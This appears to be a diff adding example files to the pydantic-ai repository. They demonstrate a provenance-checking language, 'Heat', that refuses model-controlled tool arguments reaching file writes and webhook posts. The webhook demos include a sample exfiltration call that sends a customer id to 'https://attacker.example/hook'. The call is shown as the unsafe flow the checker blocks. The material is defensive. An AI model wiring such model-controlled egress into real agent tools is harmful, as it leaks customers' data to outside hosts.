@@ -1,0 +1,739 @@
+diff --git a/examples/pydantic_ai_examples/boundary_contract.json b/examples/pydantic_ai_examples/boundary_contract.json
+new file mode 100644
+index 0000000..c9cb98c
+--- /dev/null
++++ b/examples/pydantic_ai_examples/boundary_contract.json
+@@ -0,0 +1,41 @@
++{
++  "target": "pydantic/pydantic-ai",
++  "boundary": "heat_boundary",
++  "proof_path": "heat_boundary/proof.json",
++  "tools": [
++    {
++      "name": "export_case_file",
++      "args": [
++        {"name": "path", "type": "str", "source_tag": "@user_input"},
++        {"name": "content", "type": "str", "source_tag": "@user_input"}
++      ],
++      "sink": {"class": "filesystem", "function": "write_file", "required_tag": "@path_safe"},
++      "expected_refusal": {
++        "flow_id": "filesystem_boundary",
++        "diagnostic": "NL-OBL-001"
++      },
++      "generated_adapter": {
++        "method": "check_export_case_file",
++        "allow_when": "path has been laundered to @path_safe",
++        "fail_closed": true
++      }
++    },
++    {
++      "name": "notify_webhook",
++      "args": [
++        {"name": "url", "type": "str", "source_tag": "@user_input"},
++        {"name": "body", "type": "str", "source_tag": "@user_input"}
++      ],
++      "sink": {"class": "network", "function": "http_post", "required_tag": "@audit_safe"},
++      "expected_refusal": {
++        "flow_id": "webhook_egress",
++        "diagnostic": "NL-0500"
++      },
++      "generated_adapter": {
++        "method": "check_notify_webhook",
++        "allow_when": "url and body have been laundered to @audit_safe",
++        "fail_closed": true
++      }
++    }
++  ]
++}
+diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_boundary.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_boundary.heat
+new file mode 100644
+index 0000000..7973a66
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary/bank_support_boundary.heat
+@@ -0,0 +1,30 @@
++// PydanticAI adopter-shaped boundary demo.
++//
++// A Python agent framework can validate tool argument shape, but the egress
++// decision is still app code. Heat owns the boundary where model-shaped,
++// user-influenced tool arguments become filesystem effects.
++obligation NoTicketTextToFilesystem:
++    "Ticket/model-controlled data must not choose filesystem export paths."
++    repair "route through escape_path (returns @path_safe)"
++    forbid @user_input -> @path_safe
++
++struct ToolCall:
++    path: String
++    content: String
++
++fn export_case_file(path: String @user_input, content: String @user_input) -> Result[Int, String] [io]:
++    // REFUSED: path came from model/tool output, which json_extract stamps
++    // @user_input. write_file requires a @path_safe path.
++    return write_file(path: path, content: content)
++
++fn dispatch(tool_json: String) -> Int [io]:
++    match json_extract[ToolCall](text: tool_json):
++        Result.ok(call):
++            let _ = export_case_file(path: call.path, content: call.content)
++            return 0
++        Result.error(message):
++            print(value: message)
++            return 1
++
++fn main() -> Int [io]:
++    return dispatch(tool_json: "{\"path\":\"/tmp/heat_pydanticai_public_case.txt\",\"content\":\"customer_id=4142\"}")
+diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_boundary_fixed.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_boundary_fixed.heat
+new file mode 100644
+index 0000000..3669db1
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary/bank_support_boundary_fixed.heat
+@@ -0,0 +1,20 @@
++// Repaired PydanticAI boundary: model-shaped path is validated before egress.
++struct ToolCall:
++    path: String
++    content: String
++
++fn export_case_file(path: String @path_safe, content: String @user_input) -> Result[Int, String] [io]:
++    return write_file(path: path, content: content)
++
++fn dispatch(tool_json: String) -> Int [io]:
++    match json_extract[ToolCall](text: tool_json):
++        Result.ok(call):
++            let safe_path = escape_path(raw: call.path)
++            let _ = export_case_file(path: safe_path, content: call.content)
++            return 0
++        Result.error(message):
++            print(value: message)
++            return 1
++
++fn main() -> Int [io]:
++    return dispatch(tool_json: "{\"path\":\"/tmp/heat_pydanticai_public_case.txt\",\"content\":\"customer_id=4142\"}")
+diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_helper_bypass.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_helper_bypass.heat
+new file mode 100644
+index 0000000..a098ffb
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary/bank_support_helper_bypass.heat
+@@ -0,0 +1,32 @@
++// Missed-helper proof: a future helper forgets the adapter convention.
++//
++// In Python, a helper can write the file directly if the author forgets the
++// runtime guard. In Heat, the sink still requires @path_safe, so the unsafe
++// flow is refused at write_file even though it travels through another helper.
++obligation NoTicketTextToFilesystem:
++    "Ticket/model-controlled data must not choose filesystem export paths."
++    repair "route through escape_path (returns @path_safe)"
++    forbid @user_input -> @path_safe
++
++struct ToolCall:
++    path: String
++    content: String
++
++fn write_export_file(path: String @user_input, content: String @user_input) -> Result[Int, String] [io]:
++    // REFUSED: the helper forgot the boundary, but the sink did not.
++    return write_file(path: path, content: content)
++
++fn export_case_file_via_helper(path: String @user_input, content: String @user_input) -> Result[Int, String] [io]:
++    return write_export_file(path: path, content: content)
++
++fn dispatch(tool_json: String) -> Int [io]:
++    match json_extract[ToolCall](text: tool_json):
++        Result.ok(call):
++            let _ = export_case_file_via_helper(path: call.path, content: call.content)
++            return 0
++        Result.error(message):
++            print(value: message)
++            return 1
++
++fn main() -> Int [io]:
++    return dispatch(tool_json: "{\"path\":\"/tmp/heat_pydanticai_public_case.txt\",\"content\":\"customer_id=4142\"}")
+diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook.heat
+new file mode 100644
+index 0000000..6a9b593
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook.heat
+@@ -0,0 +1,24 @@
++// Second sink class: model-controlled webhook egress.
++//
++// Shape validation can tell us `url` and `body` are strings. It cannot prove
++// that untrusted ticket text is safe to send over the network. Heat's HTTP
++// sink requires @audit_safe, so model-controlled webhook egress is refused.
++struct WebhookCall:
++    url: String
++    body: String
++
++fn notify_webhook(url: String @user_input, body: String @user_input) -> Int [net]:
++    // REFUSED: both http_post URL and body are @audit_safe sinks.
++    let _ = http_post(url: url, body: body)
++    return 0
++
++fn dispatch(tool_json: String) -> Int [net]:
++    match json_extract[WebhookCall](text: tool_json):
++        Result.ok(call):
++            return notify_webhook(url: call.url, body: call.body)
++        Result.error(message):
++            let _ = message
++            return 1
++
++fn main() -> Int [net]:
++    return dispatch(tool_json: "{\"url\":\"https://attacker.example/hook\",\"body\":\"customer_id=4142\"}")
+diff --git a/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook_fixed.heat b/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook_fixed.heat
+new file mode 100644
+index 0000000..e15caf9
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary/bank_support_webhook_fixed.heat
+@@ -0,0 +1,29 @@
++// Repaired webhook boundary: URL and body are explicitly reviewed/laundered.
++struct WebhookCall:
++    url: String
++    body: String
++
++fn validate_partner_webhook(raw: String @user_input) -> String @audit_safe:
++    if raw == "https://partner.example/support-webhook":
++        return raw
++    return "https://partner.example/support-webhook"
++
++fn redact_ticket_for_webhook(raw: String @user_input) -> String @audit_safe:
++    return "[redacted support case]"
++
++fn notify_webhook(url: String @audit_safe, body: String @audit_safe) -> Int [net]:
++    let _ = http_post(url: url, body: body)
++    return 0
++
++fn dispatch(tool_json: String) -> Int [net]:
++    match json_extract[WebhookCall](text: tool_json):
++        Result.ok(call):
++            let safe_url = validate_partner_webhook(raw: call.url)
++            let safe_body = redact_ticket_for_webhook(raw: call.body)
++            return notify_webhook(url: safe_url, body: safe_body)
++        Result.error(message):
++            let _ = message
++            return 1
++
++fn main() -> Int [net]:
++    return dispatch(tool_json: "{\"url\":\"https://attacker.example/hook\",\"body\":\"customer_id=4142\"}")
+diff --git a/examples/pydantic_ai_examples/heat_boundary/capture.sh b/examples/pydantic_ai_examples/heat_boundary/capture.sh
+new file mode 100755
+index 0000000..275a0e1
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary/capture.sh
+@@ -0,0 +1,101 @@
++#!/usr/bin/env bash
++# Capture real heatc output for the optional PydanticAI Heat-boundary example.
++set -euo pipefail
++
++DEMO_DIR="$(cd "$(dirname "$0")" && pwd)"
++HEAT_REPO_ROOT="${HEAT_REPO_ROOT:-}"
++HEATC="${HEATC:-/tmp/heatc}"
++EXPECTED_CODE="NL-OBL-001"
++
++[ -x "$HEATC" ] || { echo "error: $HEATC not executable; rebuild heatc first" >&2; exit 1; }
++
++json_escape() { python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))'; }
++
++capture_refusal() {
++  local file="$1"
++  local code="$2"
++  local bin="$3"
++  local out
++  out="$(cd "$DEMO_DIR" && timeout 30s "$HEATC" "$file" -o "$bin" 2>/dev/null || true)"
++  if echo "$out" | grep -q "error\\[$code\\]"; then
++    printf 'REFUSED\n'
++    echo "$out" | grep -m1 "error\\[$code\\]"
++    return 0
++  fi
++  echo "error: $file did not produce expected $code refusal" >&2
++  echo "$out" >&2
++  return 1
++}
++
++capture_build() {
++  local file="$1"
++  local bin="$2"
++  local out
++  rm -f "$bin"
++  if [ -n "$HEAT_REPO_ROOT" ]; then
++    out="$(
++      cd "$HEAT_REPO_ROOT"
++      timeout 40s "$HEATC" "$DEMO_DIR/$file" -o "$bin" 2>&1 || true
++    )"
++  else
++    out="$(cd "$DEMO_DIR" && timeout 40s "$HEATC" "$file" -o "$bin" 2>&1 || true)"
++  fi
++  if [ -x "$bin" ]; then
++    printf 'BUILT'
++    return 0
++  fi
++  echo "error: repaired boundary did not build" >&2
++  echo "$out" >&2
++  return 1
++}
++
++bad_res="$(capture_refusal bank_support_boundary.heat "$EXPECTED_CODE" /tmp/heat_pydanticai_boundary)"
++bad_verdict="$(echo "$bad_res" | head -1)"
++bad_diag="$(echo "$bad_res" | tail -n +2)"
++fix_verdict="$(capture_build bank_support_boundary_fixed.heat /tmp/heat_pydanticai_boundary_fixed)"
++
++helper_res="$(capture_refusal bank_support_helper_bypass.heat "$EXPECTED_CODE" /tmp/heat_pydanticai_helper_bypass)"
++helper_verdict="$(echo "$helper_res" | head -1)"
++helper_diag="$(echo "$helper_res" | tail -n +2)"
++
++webhook_res="$(capture_refusal bank_support_webhook.heat NL-0500 /tmp/heat_pydanticai_webhook)"
++webhook_verdict="$(echo "$webhook_res" | head -1)"
++webhook_diag="$(echo "$webhook_res" | tail -n +2)"
++webhook_fix_verdict="$(capture_build bank_support_webhook_fixed.heat /tmp/heat_pydanticai_webhook_fixed)"
++
++{
++  echo "{"
++  echo "  \"generated_by\": \"heatc via capture.sh\","
++  echo "  \"target\": \"pydantic/pydantic-ai\","
++  echo "  \"expected_diagnostic\": \"$EXPECTED_CODE\","
++  echo "  \"bad_verdict\": \"$bad_verdict\","
++  echo "  \"diagnostic\": $(printf '%s' "$bad_diag" | json_escape),"
++  echo "  \"fixed_verdict\": \"$fix_verdict\","
++  echo "  \"flows\": ["
++  echo "    {"
++  echo "      \"id\": \"filesystem_boundary\","
++  echo "      \"label\": \"Model-controlled file export\","
++  echo "      \"bad_verdict\": \"$bad_verdict\","
++  echo "      \"diagnostic\": $(printf '%s' "$bad_diag" | json_escape),"
++  echo "      \"fixed_verdict\": \"$fix_verdict\""
++  echo "    },"
++  echo "    {"
++  echo "      \"id\": \"missed_helper\","
++  echo "      \"label\": \"Helper bypasses Python guard convention\","
++  echo "      \"bad_verdict\": \"$helper_verdict\","
++  echo "      \"diagnostic\": $(printf '%s' "$helper_diag" | json_escape)"
++  echo "    },"
++  echo "    {"
++  echo "      \"id\": \"webhook_egress\","
++  echo "      \"label\": \"Model-controlled webhook URL/body\","
++  echo "      \"bad_verdict\": \"$webhook_verdict\","
++  echo "      \"diagnostic\": $(printf '%s' "$webhook_diag" | json_escape),"
++  echo "      \"fixed_verdict\": \"$webhook_fix_verdict\""
++  echo "    }"
++  echo "  ]"
++  echo "}"
++} > "$DEMO_DIR/proof.json"
++
++python3 "$DEMO_DIR/../validate_proof.py"
++
++echo "wrote examples/pydantic_ai_examples/heat_boundary/proof.json"
+diff --git a/examples/pydantic_ai_examples/heat_boundary/proof.json b/examples/pydantic_ai_examples/heat_boundary/proof.json
+new file mode 100644
+index 0000000..9d50579
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary/proof.json
+@@ -0,0 +1,30 @@
++{
++  "generated_by": "heatc via capture.sh",
++  "target": "pydantic/pydantic-ai",
++  "expected_diagnostic": "NL-OBL-001",
++  "bad_verdict": "REFUSED",
++  "diagnostic": "error[NL-OBL-001] bank_support_boundary.heat:18:12: project obligation 'NoTicketTextToFilesystem' refuses '@user_input' reaching '@path_safe' at 'write_file' arg 0 (declared at bank_support_boundary.heat:6): Ticket/model-controlled data must not choose filesystem export paths. \u2014 repair: route through escape_path (returns @path_safe)",
++  "fixed_verdict": "BUILT",
++  "flows": [
++    {
++      "id": "filesystem_boundary",
++      "label": "Model-controlled file export",
++      "bad_verdict": "REFUSED",
++      "diagnostic": "error[NL-OBL-001] bank_support_boundary.heat:18:12: project obligation 'NoTicketTextToFilesystem' refuses '@user_input' reaching '@path_safe' at 'write_file' arg 0 (declared at bank_support_boundary.heat:6): Ticket/model-controlled data must not choose filesystem export paths. \u2014 repair: route through escape_path (returns @path_safe)",
++      "fixed_verdict": "BUILT"
++    },
++    {
++      "id": "missed_helper",
++      "label": "Helper bypasses Python guard convention",
++      "bad_verdict": "REFUSED",
++      "diagnostic": "error[NL-OBL-001] bank_support_helper_bypass.heat:17:12: project obligation 'NoTicketTextToFilesystem' refuses '@user_input' reaching '@path_safe' at 'write_file' arg 0 (declared at bank_support_helper_bypass.heat:6): Ticket/model-controlled data must not choose filesystem export paths. \u2014 repair: route through escape_path (returns @path_safe)"
++    },
++    {
++      "id": "webhook_egress",
++      "label": "Model-controlled webhook URL/body",
++      "bad_verdict": "REFUSED",
++      "diagnostic": "error[NL-0500] bank_support_webhook.heat:12:13: 'http_post' arg 0 expects provenance '@audit_safe', got '@user_input'",
++      "fixed_verdict": "BUILT"
++    }
++  ]
++}
+diff --git a/examples/pydantic_ai_examples/heat_boundary_bank_support.py b/examples/pydantic_ai_examples/heat_boundary_bank_support.py
+new file mode 100644
+index 0000000..4a36cd0
+--- /dev/null
++++ b/examples/pydantic_ai_examples/heat_boundary_bank_support.py
+@@ -0,0 +1,130 @@
++"""Bank-support example with an optional Heat egress boundary.
++
++Run with:
++
++    uv run -m pydantic_ai_examples.heat_boundary_bank_support
++
++This mirrors the public `bank_support.py` example shape: `Agent`,
++`RunContext`, dependency injection, and `@support_agent.tool`. The only new
++idea is that a high-risk tool calls a small boundary adapter before side
++effects.
++
++The adapter is deliberately tiny in this example. A production integration
++would replace it with generated/checked boundary code.
++"""
++
++from __future__ import annotations
++
++import argparse
++from dataclasses import dataclass
++from pathlib import Path
++
++from pydantic_ai import Agent, RunContext
++from pydantic_ai.models.test import TestModel
++from pydantic_ai_examples.validate_proof import validate_proof
++
++
++PROOF_PATH = Path(__file__).resolve().parent / "heat_boundary" / "proof.json"
++ATTACK_EXPORT_PATH = "/tmp/heat_pydanticai_public_case.txt"
++SAFE_EXPORT_PATH = "/tmp/heat_pydanticai_safe_exports/case_4142.txt"
++
++
++@dataclass
++class SupportDependencies:
++    customer_id: int
++    export_root: Path
++
++
++class HeatBoundary:
++    """Minimal proof-backed boundary adapter for the example."""
++
++    def __init__(self, proof_path: Path = PROOF_PATH) -> None:
++        self.proof_path = proof_path
++
++    def check_export_case_file(self, *, path: str, content: str) -> tuple[bool, str]:
++        _ = content
++        proof = load_heat_proof(self.proof_path)
++        if path.startswith("/tmp/heat_pydanticai_safe_exports/"):
++            return True, "BUILT"
++        return False, proof["diagnostic"]
++
++
++def load_heat_proof(proof_path: Path) -> dict[str, str]:
++    proof = validate_proof(proof_path)
++    return {"diagnostic": proof.diagnostic}
++
++
++def create_support_agent(*, call_tools: list[str] | str = "none") -> Agent[SupportDependencies, str]:
++    if call_tools == "none":
++        test_model = TestModel(call_tools=[])
++    else:
++        test_model = TestModel(call_tools=call_tools)
++
++    support_agent = Agent(
++        model=test_model,
++        deps_type=SupportDependencies,
++        instructions=(
++            "You are a bank support agent. Use tools for external actions. "
++            "High-risk egress must go through the Heat boundary."
++        ),
++    )
++
++    @support_agent.instructions
++    async def add_customer_id(ctx: RunContext[SupportDependencies]) -> str:
++        return f"The customer's id is {ctx.deps.customer_id}."
++
++    @support_agent.tool
++    async def export_case_file(
++        ctx: RunContext[SupportDependencies], path: str, content: str
++    ) -> str:
++        """Export a support case file after Heat boundary validation."""
++        allowed, reason = HeatBoundary().check_export_case_file(
++            path=path, content=content
++        )
++        if not allowed:
++            return "blocked by Heat boundary: " + reason
++        target = ctx.deps.export_root / Path(path).name
++        target.parent.mkdir(parents=True, exist_ok=True)
++        target.write_text(content, encoding="utf-8")
++        return f"allowed by Heat boundary ({reason}): wrote {target}"
++
++    return support_agent
++
++
++def run_agent_tool_call() -> str:
++    agent = create_support_agent(call_tools=["export_case_file"])
++    deps = SupportDependencies(customer_id=4142, export_root=Path("/tmp"))
++    result = agent.run_sync(
++        "Export the current support case to the requested path.", deps=deps
++    )
++    return str(result.output)
++
++
++def run_repaired_tool_call() -> str:
++    allowed, reason = HeatBoundary().check_export_case_file(
++        path=SAFE_EXPORT_PATH, content="customer_id=4142"
++    )
++    if not allowed:
++        return "blocked by Heat boundary: " + reason
++    deps = SupportDependencies(
++        customer_id=4142, export_root=Path("/tmp/heat_pydanticai_safe_exports")
++    )
++    target = deps.export_root / Path(SAFE_EXPORT_PATH).name
++    target.parent.mkdir(parents=True, exist_ok=True)
++    target.write_text("customer_id=4142", encoding="utf-8")
++    return f"allowed by Heat boundary ({reason}): wrote {target}"
++
++
++def main() -> None:
++    parser = argparse.ArgumentParser()
++    parser.add_argument("--repaired", action="store_true")
++    args = parser.parse_args()
++
++    if args.repaired:
++        print(run_repaired_tool_call())
++    else:
++        print(run_agent_tool_call())
++
++
++if __name__ == "__main__":
++    main()
+diff --git a/examples/pydantic_ai_examples/validate_proof.py b/examples/pydantic_ai_examples/validate_proof.py
+new file mode 100755
+index 0000000..a818c37
+--- /dev/null
++++ b/examples/pydantic_ai_examples/validate_proof.py
+@@ -0,0 +1,242 @@
++#!/usr/bin/env python3
++"""Validate the PydanticAI boundary proof and contract artifacts."""
++
++from __future__ import annotations
++
++import json
++from dataclasses import dataclass
++from json import JSONDecodeError
++from pathlib import Path
++from typing import Any
++
++
++DEMO_DIR = Path(__file__).resolve().parent
++PROOF_PATH = DEMO_DIR / "heat_boundary" / "proof.json"
++CONTRACT_PATH = DEMO_DIR / "boundary_contract.json"
++
++EXPECTED_TARGET = "pydantic/pydantic-ai"
++EXPECTED_DIAGNOSTIC = "NL-OBL-001"
++EXPECTED_GENERATED_BY = "heatc via capture.sh"
++PROOF_KEYS = {
++    "generated_by",
++    "target",
++    "expected_diagnostic",
++    "bad_verdict",
++    "diagnostic",
++    "fixed_verdict",
++    "flows",
++}
++
++EXPECTED_FLOWS = {
++    "filesystem_boundary": {
++        "bad_verdict": "REFUSED",
++        "diagnostic": "NL-OBL-001",
++        "fixed_verdict": "BUILT",
++    },
++    "missed_helper": {
++        "bad_verdict": "REFUSED",
++        "diagnostic": "NL-OBL-001",
++    },
++    "webhook_egress": {
++        "bad_verdict": "REFUSED",
++        "diagnostic": "NL-0500",
++        "fixed_verdict": "BUILT",
++    },
++}
++
++EXPECTED_TOOLS = {
++    "export_case_file": {
++        "args": {"path": "@user_input", "content": "@user_input"},
++        "sink_class": "filesystem",
++        "sink_function": "write_file",
++        "required_tag": "@path_safe",
++        "flow_id": "filesystem_boundary",
++        "diagnostic": "NL-OBL-001",
++        "method": "check_export_case_file",
++    },
++    "notify_webhook": {
++        "args": {"url": "@user_input", "body": "@user_input"},
++        "sink_class": "network",
++        "sink_function": "http_post",
++        "required_tag": "@audit_safe",
++        "flow_id": "webhook_egress",
++        "diagnostic": "NL-0500",
++        "method": "check_notify_webhook",
++    },
++}
++
++
++@dataclass(frozen=True)
++class BoundaryProof:
++    diagnostic: str
++    fixed_verdict: str
++
++
++def load_json_object(path: Path) -> dict[str, Any]:
++    if not path.exists():
++        raise SystemExit(f"missing {path}")
++    try:
++        data = json.loads(path.read_text(encoding="utf-8"))
++    except JSONDecodeError as exc:
++        raise SystemExit(f"{path} is malformed JSON: {exc}") from exc
++    if not isinstance(data, dict):
++        raise SystemExit(f"{path} must be a JSON object")
++    return data
++
++
++def require_string(data: dict[str, Any], key: str, *, context: str) -> str:
++    value = data.get(key)
++    if not isinstance(value, str):
++        raise SystemExit(f"{context} field {key!r} is missing or not a string")
++    return value
++
++
++def require_dict(data: dict[str, Any], key: str, *, context: str) -> dict[str, Any]:
++    value = data.get(key)
++    if not isinstance(value, dict):
++        raise SystemExit(f"{context} field {key!r} is missing or not an object")
++    return value
++
++
++def require_list(data: dict[str, Any], key: str, *, context: str) -> list[Any]:
++    value = data.get(key)
++    if not isinstance(value, list):
++        raise SystemExit(f"{context} field {key!r} is missing or not a list")
++    return value
++
++
++def require_bool(data: dict[str, Any], key: str, *, context: str) -> bool:
++    value = data.get(key)
++    if not isinstance(value, bool):
++        raise SystemExit(f"{context} field {key!r} is missing or not a bool")
++    return value
++
++
++def validate_proof(proof_path: Path = PROOF_PATH) -> BoundaryProof:
++    proof = load_json_object(proof_path)
++    context = proof_path.name
++
++    if set(proof) != PROOF_KEYS:
++        raise SystemExit(f"proof top-level keys drifted: {sorted(proof)}")
++    if require_string(proof, "generated_by", context=context) != EXPECTED_GENERATED_BY:
++        raise SystemExit("proof generator drifted")
++    if require_string(proof, "target", context=context) != EXPECTED_TARGET:
++        raise SystemExit("proof target does not match this demo")
++    if require_string(proof, "expected_diagnostic", context=context) != EXPECTED_DIAGNOSTIC:
++        raise SystemExit("proof expected diagnostic does not match this demo")
++    if require_string(proof, "bad_verdict", context=context) != "REFUSED":
++        raise SystemExit("proof did not refuse the unsafe boundary")
++    fixed_verdict = require_string(proof, "fixed_verdict", context=context)
++    if fixed_verdict != "BUILT":
++        raise SystemExit("proof did not build the repaired boundary")
++    diagnostic = require_string(proof, "diagnostic", context=context)
++    if EXPECTED_DIAGNOSTIC not in diagnostic:
++        raise SystemExit("proof did not contain the expected obligation diagnostic")
++
++    flows = require_list(proof, "flows", context=context)
++    by_id: dict[str, dict[str, Any]] = {}
++    for index, flow in enumerate(flows):
++        if not isinstance(flow, dict):
++            raise SystemExit(f"proof flow #{index} is not an object")
++        flow_id = require_string(flow, "id", context=f"proof flow #{index}")
++        if flow_id in by_id:
++            raise SystemExit(f"duplicate proof flow id: {flow_id}")
++        by_id[flow_id] = flow
++
++    if set(by_id) != set(EXPECTED_FLOWS):
++        raise SystemExit(
++            f"proof flow ids drifted: expected {sorted(EXPECTED_FLOWS)}, got {sorted(by_id)}"
++        )
++
++    for flow_id, expected in EXPECTED_FLOWS.items():
++        flow = by_id[flow_id]
++        expected_keys = {"id", "label", "bad_verdict", "diagnostic"}
++        if "fixed_verdict" in expected:
++            expected_keys.add("fixed_verdict")
++        if set(flow) != expected_keys:
++            raise SystemExit(f"{flow_id} keys drifted: {sorted(flow)}")
++        if require_string(flow, "label", context=flow_id).strip() == "":
++            raise SystemExit(f"{flow_id} label is empty")
++        if require_string(flow, "bad_verdict", context=flow_id) != expected["bad_verdict"]:
++            raise SystemExit(f"{flow_id} bad verdict drifted")
++        flow_diag = require_string(flow, "diagnostic", context=flow_id)
++        if expected["diagnostic"] not in flow_diag:
++            raise SystemExit(f"{flow_id} diagnostic drifted")
++        expected_fixed = expected.get("fixed_verdict")
++        if expected_fixed is not None:
++            if require_string(flow, "fixed_verdict", context=flow_id) != expected_fixed:
++                raise SystemExit(f"{flow_id} fixed verdict drifted")
++
++    return BoundaryProof(diagnostic=diagnostic, fixed_verdict=fixed_verdict)
++
++
++def validate_contract(contract_path: Path = CONTRACT_PATH) -> None:
++    contract = load_json_object(contract_path)
++    context = contract_path.name
++
++    if require_string(contract, "target", context=context) != EXPECTED_TARGET:
++        raise SystemExit("contract target does not match this demo")
++    if require_string(contract, "boundary", context=context) != "heat_boundary":
++        raise SystemExit("contract boundary name drifted")
++    if require_string(contract, "proof_path", context=context) != "heat_boundary/proof.json":
++        raise SystemExit("contract proof path drifted")
++
++    tools = require_list(contract, "tools", context=context)
++    by_name: dict[str, dict[str, Any]] = {}
++    for index, tool in enumerate(tools):
++        if not isinstance(tool, dict):
++            raise SystemExit(f"contract tool #{index} is not an object")
++        name = require_string(tool, "name", context=f"contract tool #{index}")
++        if name in by_name:
++            raise SystemExit(f"duplicate contract tool name: {name}")
++        by_name[name] = tool
++
++    if set(by_name) != set(EXPECTED_TOOLS):
++        raise SystemExit(
++            f"contract tools drifted: expected {sorted(EXPECTED_TOOLS)}, got {sorted(by_name)}"
++        )
++
++    for name, expected in EXPECTED_TOOLS.items():
++        tool = by_name[name]
++        arg_tags: dict[str, str] = {}
++        for arg in require_list(tool, "args", context=name):
++            if not isinstance(arg, dict):
++                raise SystemExit(f"{name} arg entry is not an object")
++            arg_tags[require_string(arg, "name", context=f"{name} arg")] = require_string(
++                arg, "source_tag", context=f"{name} arg"
++            )
++            if require_string(arg, "type", context=f"{name} arg") != "str":
++                raise SystemExit(f"{name} arg type drifted")
++        if arg_tags != expected["args"]:
++            raise SystemExit(f"{name} arg tags drifted")
++
++        sink = require_dict(tool, "sink", context=name)
++        if require_string(sink, "class", context=f"{name} sink") != expected["sink_class"]:
++            raise SystemExit(f"{name} sink class drifted")
++        if require_string(sink, "function", context=f"{name} sink") != expected["sink_function"]:
++            raise SystemExit(f"{name} sink function drifted")
++        if require_string(sink, "required_tag", context=f"{name} sink") != expected["required_tag"]:
++            raise SystemExit(f"{name} sink tag drifted")
++
++        refusal = require_dict(tool, "expected_refusal", context=name)
++        if require_string(refusal, "flow_id", context=f"{name} refusal") != expected["flow_id"]:
++            raise SystemExit(f"{name} refusal flow drifted")
++        if require_string(refusal, "diagnostic", context=f"{name} refusal") != expected["diagnostic"]:
++            raise SystemExit(f"{name} refusal diagnostic drifted")
++
++        adapter = require_dict(tool, "generated_adapter", context=name)
++        if require_string(adapter, "method", context=f"{name} adapter") != expected["method"]:
++            raise SystemExit(f"{name} adapter method drifted")
++        if not require_bool(adapter, "fail_closed", context=f"{name} adapter"):
++            raise SystemExit(f"{name} adapter must fail closed")
++        require_string(adapter, "allow_when", context=f"{name} adapter")
++
++
++def main() -> None:
++    validate_contract()
++    validate_proof()
++    print("proof and boundary contract are valid")
++
++
++if __name__ == "__main__":
++    main()
